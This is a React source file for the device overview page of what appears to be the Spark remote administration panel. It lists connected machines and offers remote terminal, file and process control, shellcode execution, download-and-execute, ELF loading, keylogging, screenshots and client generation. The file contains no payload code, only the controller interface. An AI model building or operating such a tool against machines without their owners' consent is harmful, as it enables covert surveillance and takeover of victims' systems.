import React, {useEffect, useRef, useState} from 'react';
import ProTable, {TableDropdown} from '@ant-design/pro-table';
import {Button, Image, message, Modal, Progress, Tooltip} from 'antd';
import { catchBlobReq, formatSize, request, tsToTime, waitTime, renderUnixEpochToHumanReadable } from "../utils/utils";
import {QuestionCircleOutlined} from "@ant-design/icons";
import i18n from "../locale/locale";

import { SearchOutlined } from '@ant-design/icons';
import { Input, Space, Table } from 'antd';
import Highlighter from 'react-highlight-words';

// DO NOT EDIT OR DELETE THIS COPYRIGHT MESSAGE.
console.log("%c By XZB %c https://github.com/XZB-1248/Spark", 'font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-size:64px;color:#00bbee;-webkit-text-fill-color:#00bbee;-webkit-text-stroke:1px#00bbee;', 'font-size:12px;');

let ComponentMap = {
	Generate: null,
	Explorer: null,
	Terminal: null,
	ProcMgr: null,
	Desktop: null,
	Execute: null,
	Shellcode: null,
	Executable: null,
	Loadelf: null,
	Keylog: null,
};

function overview(props) {
	const [searchText, setSearchText] = useState('');
	const [searchedColumn, setSearchedColumn] = useState('');
	const [loading, setLoading] = useState(false);
	const [execute, setExecute] = useState(false);
	const [shellcode, setShellcode] = useState(false);
	const [executable, setExecutable] = useState(false);
	const [loadelf, setLoadelf] = useState(false);
	const [desktop, setDesktop] = useState(false);
	const [procMgr, setProcMgr] = useState(false);
	const [explorer, setExplorer] = useState(false);
	const [generate, setGenerate] = useState(false);
	const [terminal, setTerminal] = useState(false);
	const [keylog, setKeylog] = useState(false);
	const [screenBlob, setScreenBlob] = useState('');
	const [dataSource, setDataSource] = useState([]);


	const options = {
		show: true,
		density: true,
		setting: true,
	};
	const tableRef = useRef();
	const searchInput = useRef(null);
	const loadComponent = (component, callback) => {
		let element = null;
		component = component.toLowerCase();
		Object.keys(ComponentMap).forEach(k => {
			if (k.toLowerCase() === component.toLowerCase()) {
				element = k;
			}
		});
		if (!element) return;
		if (ComponentMap[element] === null) {
			import('../components/'+component+'/'+component).then((m) => {
				ComponentMap[element] = m.default;
				callback();
			});
		} else {
			callback();
		}
	}
	const handleSearch = (selectedKeys, confirm, dataIndex) => {
		confirm();
		setSearchText(selectedKeys[0]);
		setSearchedColumn(dataIndex);
	};
	const handleReset = (clearFilters, confirm) => {
		clearFilters();
		setSearchText('');
		confirm();
		setSearchedColumn();
	};
	const getColumnSearchProps = dataIndex => ({
		filterDropdown: ({ setSelectedKeys, selectedKeys, confirm, clearFilters, close }) => (
			<div style={{ padding: 8 }} onKeyDown={e => e.stopPropagation()}>
				<Input
					ref={searchInput}
					placeholder={`Search ${dataIndex}`}
					value={selectedKeys[0]}
					onChange={e => setSelectedKeys(e.target.value ? [e.target.value] : [])}
					onPressEnter={() => handleSearch(selectedKeys, confirm, dataIndex)}
					style={{ marginBottom: 8, display: 'block' }}
				/>
				<Space>
					<Button
						type="primary"
						onClick={() => handleSearch(selectedKeys, confirm, dataIndex)}
						icon={<SearchOutlined />}
						size="small"
						style={{ width: 90 }}
					>
						Search
					</Button>
					<Button
						onClick={() => clearFilters && handleReset(clearFilters, confirm)}
						size="small"
						style={{ width: 90 }}
					>
						Reset
					</Button>
					<Button
						type="link"
						size="small"
						onClick={() => {
							confirm({ closeDropdown: false });
							setSearchText(selectedKeys[0]);
							setSearchedColumn(dataIndex);
						}}
					>
						Filter
					</Button>

				</Space>
			</div>
		),
		filterIcon: filtered => <SearchOutlined style={{ color: filtered ? '#1677ff' : undefined }} />,
		onFilter: (value, record) =>
			record[dataIndex].toString().toLowerCase().includes(value.toLowerCase()),
		filterDropdownProps: {
			onOpenChange(open) {
				if (open) {
					setTimeout(() => {
						var _a;
						return (_a = searchInput.current) === null || _a === void 0 ? void 0 : _a.select();
					}, 100);
				}
			},
		},
		render: text =>
			searchedColumn === dataIndex ? (
				<Highlighter
					highlightStyle={{ backgroundColor: '#ffc069', padding: 0 }}
					searchWords={[searchText]}
					autoEscape
					textToHighlight={text ? text.toString() : ''}
				/>
			) : (
				text
			),
	});

	const columns = [
		Object.assign(
			Object.assign(
				{ title: i18n.t('OVERVIEW.HOSTNAME'), dataIndex: 'hostname', key: 'hostname', width: 100 },
				getColumnSearchProps('hostname')
			),
			{
				sorter: (a, b) => a.hostname.localeCompare(b.hostname),
				sortDirections: ['descend', 'ascend'],
			},
		),
		Object.assign(
			Object.assign(
				{ title: i18n.t('OVERVIEW.USERNAME'), dataIndex: 'username', key: 'username', width: 90 },
				getColumnSearchProps('username')
			),
			{
				sorter: (a, b) => a.username.localeCompare(b.username),
				sortDirections: ['descend', 'ascend'],
			},
		),
		Object.assign(
			Object.assign(
				{ title: i18n.t('OVERVIEW.OS'), dataIndex: 'os', key: 'os', width: 90 },
				getColumnSearchProps('os')
			),
			{
				sorter: (a, b) => a.os.localeCompare(b.os),
				sortDirections: ['descend', 'ascend'],
			},
		),
		Object.assign(
			Object.assign(
				{ title: 'LAN', dataIndex: 'lan', key: 'lan', width: 90 },
				getColumnSearchProps('lan')
			),
			{
				sorter: (a, b) => {
					const normalize = ip => {
						if (!ip) return '';
						if (ip.includes('.')) {
							return ip.split('.').reduce((acc, octet) => (acc << 8) + parseInt(octet, 10), 0);
						}
						return ip
							.split(':')
							.map(part => part.padStart(4, '0'))
							.join(':');
					};
					const ipA = normalize(a.lan);
					const ipB = normalize(b.lan);
					if (ipA < ipB) return -1;
					if (ipA > ipB) return 1;
					return 0;
				},
				sortDirections: ['descend', 'ascend'],
			},
		),
		Object.assign(
			Object.assign(
				{ title: 'WAN', dataIndex: 'wan', key: 'wan', width: 90 },
				getColumnSearchProps('wan')
			),
			{
				sorter: (a, b) => {
					const normalize = ip => {
						if (!ip) return '';
						if (ip.includes('.')) {
							return ip.split('.').reduce((acc, octet) => (acc << 8) + parseInt(octet, 10), 0);
						}
						return ip
							.split(':')
							.map(part => part.padStart(4, '0'))
							.join(':');
					};
					const ipA = normalize(a.wan);
					const ipB = normalize(b.wan);
					if (ipA < ipB) return -1;
					if (ipA > ipB) return 1;
					return 0;
				},
				sortDirections: ['descend', 'ascend'],
			},
		),
		Object.assign(
			Object.assign(
				{ title: 'Client', dataIndex: 'clientuptime', key: 'clientuptime', width: 90, renderText: renderUnixEpochToHumanReadable }
			),
			{
				sorter: (a, b) => a.clientuptime.toString().localeCompare(b.clientuptime.toString()),
				sortDirections: ['descend', 'ascend'],
			},
		),
		Object.assign(
			Object.assign(
				{ title: i18n.t('OVERVIEW.UPTIME'), dataIndex: 'uptime', key: 'uptime', width: 90, renderText: tsToTime }
			)
		),
		{
			key: 'option',
			title: i18n.t('OVERVIEW.OPERATIONS'),
			dataIndex: 'id',
			valueType: 'option',
			ellipsis: false,
			render: (_, device) => renderOperation(device),
			width: 170
		},
	];
	useEffect(() => {
		// auto update is only available when all modal are closed.
		if (!execute && !shellcode && !desktop && !procMgr && !explorer && !generate && !terminal) {
			let id = setInterval(getData, 3000);
			return () => {
				clearInterval(id);
			};
		}
	}, [execute, shellcode, desktop, procMgr, explorer, generate, terminal]);


	function renderOperation(device) {
		let menus = [
			{ key: 'executable', name: "DL and Execute"},
			{key: 'loadelf', name: "Load ELF"},
			{ key: 'keylog', name: 'Keylog'},
			{key: 'restart', name: i18n.t('OVERVIEW.RESTART')},
			{ key: 'shutdown', name: i18n.t('OVERVIEW.SHUTDOWN') },
			{ key: 'KILL', name: <i class="fa-solid fa-skull-crossbones"></i>},
		];
		return [
			<Tooltip key="terminal-tooltip" title={i18n.t('OVERVIEW.TERMINAL') || "Terminal"}>
				<a key='terminal' onClick={() => onMenuClick('terminal', device)}>{<i className="fa-solid fa-terminal"></i>}</a>
			</Tooltip>,
			<Tooltip key="explorer-tooltip" title={i18n.t('OVERVIEW.EXPLORER') || "File Explorer"}>
				<a key='explorer' onClick={() => onMenuClick('explorer', device)}>{<i className="fa-regular fa-folder-open"></i>}</a>
			</Tooltip>,
			<Tooltip key="procmgr-tooltip" title={i18n.t('OVERVIEW.PROC_MANAGER') || "Process Manager"}>
				<a key='procmgr' onClick={() => onMenuClick('procmgr', device)}>{<i className="fa-solid fa-gear"></i>}</a>
			</Tooltip>,
			<Tooltip key="execute-tooltip" title={i18n.t('OVERVIEW.EXECUTE') || "Execute"}>
				<a key='execute' onClick={() => onMenuClick('execute', device)}>{<i class="fa-regular fa-circle-play"></i>}</a>
			</Tooltip>,
			<Tooltip key="shellcode-tooltip" title={i18n.t('OVERVIEW.SHELLCODE') || "Shellcode"}>
				<a key='shellcode' onClick={() => onMenuClick('shellcode', device)}>{<i class="fa-regular fa-file-code"></i>}</a>
			</Tooltip>,
			<Tooltip key="desktop-tooltip" title={i18n.t('OVERVIEW.DESKTOP') || "Desktop"}>
				<a key='desktop' onClick={() => onMenuClick('desktop', device)}>{<i class="fa-solid fa-display"></i>}</a>
			</Tooltip>,
			<Tooltip key="screenshot-tooltip" title={i18n.t('OVERVIEW.SCREENSHOT') || "Screenshot"}>
				<a key='screenshot' onClick={() => onMenuClick('screenshot', device)}>{<i class="fa-regular fa-image"></i>}</a>
			</Tooltip>,
			<TableDropdown
				key='more'
				onSelect={key => onMenuClick(key, device)}
				menus={menus}
			/>,
		]
	}

	function onMenuClick(act, value) {

		const device = value;
		let hooksMap = {
			terminal: setTerminal,
			keylog: setKeylog,
			explorer: setExplorer,
			generate: setGenerate,
			procmgr: setProcMgr,
			execute: setExecute,
			executable: setExecutable,
			loadelf: setLoadelf,
			shellcode: setShellcode,
			desktop: setDesktop,
		};
		if (hooksMap[act]) {
			setLoading(true);
			loadComponent(act, () => {
				hooksMap[act](device);
				setLoading(false);
			});
			return;
		}
		if (act === 'screenshot') {
			request('/api/device/screenshot/get', {device: device.id}, {}, {
				responseType: 'blob'
			}).then(res => {
				if ((res.data.type ?? '').substring(0, 5) === 'image') {
					if (screenBlob.length > 0) {
						URL.revokeObjectURL(screenBlob);
					}
					setScreenBlob(URL.createObjectURL(res.data));
				}
			}).catch(catchBlobReq);
			return;
		}

		Modal.confirm({
			okText:"Yes",
        	cancelText:"No",
			title: i18n.t('OVERVIEW.OPERATION_CONFIRM').replace('{0}', i18n.t('OVERVIEW.'+act.toUpperCase())),
			icon: <QuestionCircleOutlined/>,
			onOk() {
				request('/api/device/' + act, {device: device.id}).then(res => {
					let data = res.data;
					if (data.code === 0) {
						message.success(i18n.t('OVERVIEW.OPERATION_SUCCESS'));
						tableRef.current.reload();
					}
				});
			}
		});
	}

	function toolBar() {
		//return
		return (
			<Button type='primary' onClick={() => onMenuClick('generate', true)}>{i18n.t('OVERVIEW.GENERATE')}</Button>
		)
	}

	async function getData(form) {
		await waitTime(300);
		let res = await request('/api/device/list');
		let data = res.data;
		if (data.code === 0) {
			let result = [];
			for (const uuid in data.data) {
				let temp = data.data[uuid];
				temp.conn = uuid;
				result.push(temp);
			}
			// Iterate all object and expand them.
			for (let i = 0; i < result.length; i++) {
				for (const k in result[i]) {
					if (typeof result[i][k] === 'object') {
						for (const key in result[i][k]) {
							result[i][k + '_' + key] = result[i][k][key];
						}
					}
				}
			}
			result = result.sort((first, second) => {
				let firstEl = first.hostname.toUpperCase();
				let secondEl = second.hostname.toUpperCase();
				if (firstEl < secondEl) return -1;
				if (firstEl > secondEl) return 1;
				return 0;
			});
			result = result.sort((first, second) => {
				let firstEl = first.os.toUpperCase();
				let secondEl = second.os.toUpperCase();
				if (firstEl < secondEl) return -1;
				if (firstEl > secondEl) return 1;
				return 0;
			});
			setDataSource(result);
			return ({
				data: result,
				success: true,
				total: result.length
			});
		}
		return ({data: [], success: false, total: 0});
	}

	return (
		<>
			<Image
				preview={{
					visible: !!screenBlob,
					src: screenBlob,
					onVisibleChange: () => {
						URL.revokeObjectURL(screenBlob);
						setScreenBlob('');
					}
				}}
			/>
			{
				ComponentMap.Generate &&
				<ComponentMap.Generate
					visible={generate}
					onVisibleChange={setGenerate}
				/>
			}
			{
				ComponentMap.Execute &&
				<ComponentMap.Execute
					visible={execute}
					device={execute}
					onCancel={setExecute.bind(null, false)}
				/>
			}
			{
				ComponentMap.Shellcode &&
				<ComponentMap.Shellcode
					visible={shellcode}
					device={shellcode}
					onCancel={setShellcode.bind(null, false)}
				/>
			}
			{
				ComponentMap.Executable &&
				<ComponentMap.Executable
					visible={executable}
					device={executable}
					onCancel={setExecutable.bind(null, false)}
				/>
			}
			{
				ComponentMap.Loadelf &&
				<ComponentMap.Loadelf
					visible={loadelf}
					device={loadelf}
					onCancel={setLoadelf.bind(null, false)}
				/>
			}
			{
				ComponentMap.Explorer &&
				<ComponentMap.Explorer
					open={explorer}
					device={explorer}
					onCancel={setExplorer.bind(null, false)}
				/>
			}
			{
				ComponentMap.ProcMgr &&
				<ComponentMap.ProcMgr
					open={procMgr}
					device={procMgr}
					onCancel={setProcMgr.bind(null, false)}
				/>
			}
			{
				ComponentMap.Desktop &&
				<ComponentMap.Desktop
					open={desktop}
					device={desktop}
					onCancel={setDesktop.bind(null, false)}
				/>
			}
			{
				ComponentMap.Terminal &&
				<ComponentMap.Terminal
					open={terminal}
					device={terminal}
					onCancel={setTerminal.bind(null, false)}
				/>
			}
			{
				ComponentMap.Keylog &&
				<ComponentMap.Keylog
					open={keylog}
					device={keylog}
					onCancel={setKeylog.bind(null, false)}
				/>
			}
			{
				ComponentMap.Shellcode &&
				<ComponentMap.Shellcode
					open={shellcode}
					device={shellcode}
					onCancel={setShellcode.bind(null, false)}
				/>
			}
			<ProTable
				scroll={{
					x: 'max-content',
					scrollToFirstRowOnChange: true
				}}
				rowKey='id'
				search={false}
				options={options}
				columns={columns}
				columnsState={{
					persistenceKey: 'columnsState',
					persistenceType: 'localStorage'
				}}
				onLoadingChange={setLoading}
				loading={loading}
				request={getData}
				pagination={false}
				actionRef={tableRef}
				toolBarRender={toolBar}
				dataSource={dataSource}
				onDataSourceChange={setDataSource}
			/>
		</>
	);

}
function UsageBar(props) {
	let {usage} = props;
	usage = usage || 0;
	usage = Math.round(usage * 100) / 100;

	return (
		<Tooltip
			title={props.title??`${usage}%`}
			overlayInnerStyle={{
				whiteSpace: 'nowrap',
				wordBreak: 'keep-all',
				maxWidth: '300px',
			}}
			overlayStyle={{
				maxWidth: '300px',
			}}
		>
			<Progress percent={usage} showInfo={false} strokeWidth={12} trailColor='#FFECFF'/>
		</Tooltip>
	);
}

function wrapper(props) {
	let Component = overview;
	return (<Component {...props} key={Math.random()}/>)
}

export default wrapper;